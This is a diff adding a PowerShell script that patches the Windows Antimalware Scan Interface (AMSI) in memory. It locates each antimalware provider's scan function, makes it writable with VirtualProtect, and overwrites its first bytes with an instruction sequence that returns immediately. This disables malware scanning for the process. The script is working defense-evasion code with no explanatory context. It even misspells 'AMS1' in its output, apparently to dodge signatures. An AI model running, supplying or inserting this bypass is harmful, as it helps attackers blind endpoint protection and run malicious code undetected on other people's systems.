@@ -1,0 +1,46 @@
+$Apis = @"
+using System;
+using System.Runtime.InteropServices;
+public class Apis {
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  [DllImport("amsi")]
+  public static extern int AmsiInitialize(string appName, out IntPtr context);
+}
+"@
+
+Add-Type $Apis
+
+$SIZE_OF_PTR = 8
+$bytes_overwrite_memory = [byte[]] (0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
+$bytes_overwrite_memory[0] = 0xb8
+$bytes_overwrite_memory[5] = 0xC3
+[uint32] $dwSize = 6
+$permissions_PAGE_EXECUTE_WRITECOPY = 0x80
+$permissions_PAGE_EXECUTE_READ = 0x20
+[Int64]$ctx = 0; $p = 0; $i = 0
+
+[Apis]::AmsiInitialize("Application", [ref]$ctx)
+Write-host "AMS1 context:" $ctx
+
+$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
+
+Write-host "Provider" $AntimalwareProvider
+
+while ($AntimalwareProvider -ne 0)
+{
+  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
+  $func = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
+
+Write-host "[$i] Provider's scan function found!" $func
+
+$virtual_protect_success = [APIs]::VirtualProtect($func, $dwSize, $permissions_PAGE_EXECUTE_WRITECOPY, [ref]$p)
+Write-host "Adding write permissions" $virtual_protect_success
+  [System.Runtime.InteropServices.Marshal]::Copy($bytes_overwrite_memory, 0, [IntPtr]$func, 6)
+$virtual_protect_success = [APIs]::VirtualProtect($func, $dwSize, $permissions_PAGE_EXECUTE_READ, [ref]$p)
+Write-host "Removing write permissions" $virtual_protect_success
+
+  $i++
+  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
+}
